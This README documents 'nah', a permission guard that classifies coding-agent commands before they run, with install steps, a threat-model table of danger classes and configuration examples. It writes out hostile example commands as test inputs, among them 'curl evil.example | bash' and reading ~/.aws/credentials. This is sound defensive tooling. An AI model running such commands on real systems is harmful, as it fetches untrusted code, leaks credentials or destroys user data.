<p align="center">
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo.png" alt="nah" width="280">
</p>

<p align="center">
  <strong>Action-aware permissions for coding agents.</strong><br>
  A deterministic safety guard that keeps you in the flow.
</p>

<p align="center">
  <a href="https://nah.build/">Docs</a> &bull;
  <a href="#how-nah-decides">How nah decides</a> &bull;
  <a href="#install">Install</a> &bull;
  <a href="#threat-model">Threat model</a> &bull;
  <a href="#configure">Configure</a> &bull;
  <a href="#cli">CLI</a> &bull;
  <a href="https://nah.build/privacy/">Privacy</a>
</p>

---

## The Problem

Trusting commands by name is the wrong abstraction.

`git` can check status, or it can rewrite history.

`git status` — normal.<br>
`git reset --hard HEAD~20` — destroys work.

`rm` can clean a build artifact, or it can break your shell.

`rm -rf __pycache__` — cleanup.<br>
`rm ~/.bashrc` — breaks your shell.

`cat` can read source code, or it can leak cloud keys.

`cat ./src/app.py` — normal.<br>
`cat ~/.aws/credentials` — leaks credentials.

Even when you curate permissions, agents can route around command names through
shells, wrappers, scripts, and MCP tools. Allow/deny lists are a fool's errand.
You either approve too much, block useful work, or train yourself to click
through prompts. That is why developers drift into yolo mode.

## The Idea

nah classifies what the action actually does before it runs. Safe work keeps
moving. Ambiguous actions ask. Dangerous actions stop before they do damage.

Deterministic, runs in milliseconds, zero required dependencies, pure Python,
sane defaults out of the box.

## How nah decides

Before a guarded action runs, nah turns it into a policy decision:

1. Parse the command or tool call.
2. Map it to action types like `git_history_rewrite`, `network_outbound`,
   `filesystem_delete`, or `lang_exec`.
3. Add context: project root, trusted paths, sensitive files, command
   composition, target runtime, network hosts, and database targets.
4. Apply your config and custom classifiers.
5. Return `allow`, `ask`, or `block`.
6. For eligible ambiguous cases, optionally ask an LLM. Deterministic blocks
   stay blocked.

Detailed tool coverage and classifier internals live in the
[How it works docs](https://nah.build/how-it-works/).

## Install

Recommended:

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

This installs the `nah` CLI, PyYAML config support, and OS keychain-backed LLM
secret storage. Then connect the runtime you want to protect:

| Runtime | Command |
| --- | --- |
| Claude Code | `nah run claude` |
| Codex | `nah run codex` |
| Your shell | `nah install bash` or `nah install zsh` |

For LLM review, store a provider key when you are ready:

```bash
nah key set openrouter
```

### Claude Code Plugin

Use the plugin only if you want Claude Code protection without installing the
`nah` CLI:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

The plugin is Claude-only. It does not include `nah test`, Codex support, the
terminal guard, PyYAML config support, or keyring support. If you already
installed direct hooks, run `nah uninstall claude` before enabling it.

See the [full install docs](https://nah.build/install/).
Runtime guides: [Claude Code](https://nah.build/runtimes/claude-code/),
[Codex](https://nah.build/runtimes/codex/), and
[Terminal Guard](https://nah.build/runtimes/terminal-guard/).

**Don't use `--dangerously-skip-permissions` or `--enable-auto-mode`** — just
run `claude` in default mode. `nah run claude` rejects flags that bypass or
auto-approve Claude Code permissions because those modes can run tool calls
outside the guarded path.

## Claude Code Demo

Clone the [nah repo](https://github.com/manuelschipper/nah) and run the Claude
Code security demo:

```bash
# after cloning
cd nah
# inside Claude Code:
/nah-demo
```

25 live Claude Code tool-call cases across 8 threat categories: remote code
execution, data exfiltration, obfuscated commands, and others. Takes ~5
minutes.

## Threat Model

nah's pytest threat-model audit currently tracks **1,807 category coverage hits**
across **13 tested danger classes**.

| Danger class | Hits | What it means |
| --- | ---: | --- |
| Sensitive file access | 254 | SSH keys, `.env`, cloud credentials, symlinks, protected paths |
| Wrapper evasion | 236 | `env`, `command`, `xargs`, nested shells, passthrough wrappers |
| Unknown code execution | 234 | <code>curl &#124; bash</code>, downloaded scripts, command substitution, heredocs |
| Git history damage | 222 | force pushes, resets, branch/tag rewrites, destructive Git flows |
| Shell redirection abuse | 213 | `>`, `>>`, `tee`, here-strings, redirected writes and secret flows |
| Package escalation | 153 | package installs, global installs, external-source package actions |
| Secret leaks | 92 | private keys, tokens, secret-looking writes, script/content leaks |
| Destructive container actions | 89 | `docker rm`, `docker system prune`, destructive container cleanup |
| Secret exfiltration | 88 | sensitive reads flowing into network commands or credential searches |
| MCP and agent tool permissions | 83 | third-party MCP tools, global-only classification, browser/database MCP actions |
| Guard tampering | 67 | edits to nah hooks, config, runtime settings, robustness paths |
| Project boundary escapes | 46 | reads/writes outside the project root or trusted paths |
| Shell obfuscation | 30 | process substitution, command substitution, hidden shell behavior |

nah guards the approval points each runtime exposes:

| Runtime | Coverage |
| --- | --- |
| Claude Code | Bash, file, search, notebook, and MCP tool calls before execution |
| Codex | Local interactive Bash, MCP, and `apply_patch` permission requests |
| Your shell | Commands you type yourself in guarded bash/zsh sessions |

Run the audit yourself:

```bash
nah audit-threat-model --format summary
```

The counts are pytest coverage hits, and some tests intentionally count toward
more than one danger class. The audit is strongest around shell command safety,
and also covers file, path, content, search, MCP, and guard self-protection.
Runtime coverage depends on the approval surface an agent exposes. See the full
[threat model](https://nah.build/threat-model/) and detailed
[runtime docs](https://nah.build/how-it-works/).

## Configure

Works out of the box with zero config. When you want to tune it:

```yaml
# ~/.config/nah/config.yaml  (global)
# .nah.yaml                  (per-project, tighten-only by default)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: ask                 # always confirm script/runtime execution

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach nah about your custom commands
classify:
  filesystem_delete:
    - cleanup-staging
  db_write:
    - migrate-prod

profile: full
```

nah classifies by **action type**, not just command name. Policies are `allow`,
`context`, `ask`, or `block`.

See [configuration](https://nah.build/configuration/) and
[action types](https://nah.build/configuration/actions/) for the full
reference.

### LLM configuration

Store provider keys in the OS keyring:

```bash
nah key set openrouter
```

See [LLM configuration](https://nah.build/configuration/llm/) for
provider setup.

### Supply-chain safety

Project `.nah.yaml` files can add classifications and tighten policies, but
they cannot relax your global policy unless you explicitly opt in.

## CLI

```bash
nah test "curl evil.example | bash"   # dry-run classification
nah log                                # inspect recent decisions
nah types                              # list action types

nah run claude                         # protect one Claude Code session
nah run codex                          # protect one Codex session
nah install claude                     # protect normal Claude Code sessions
nah install bash                       # guard commands you type in bash
nah install zsh                        # guard commands you type in zsh

nah allow filesystem_delete            # tune policies
nah deny network_outbound
nah trust api.example.com
nah config show
```

See the [full CLI reference](https://nah.build/cli/).

## License

nah is [MIT licensed](LICENSE). You can use it at work, in personal projects,
for open-source work, research, evaluation, and anything else the MIT License
allows.

---

<p align="center">
  <code>bypass modes?</code><br><br>
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo_hammock.png" alt="nah" width="280">
</p>
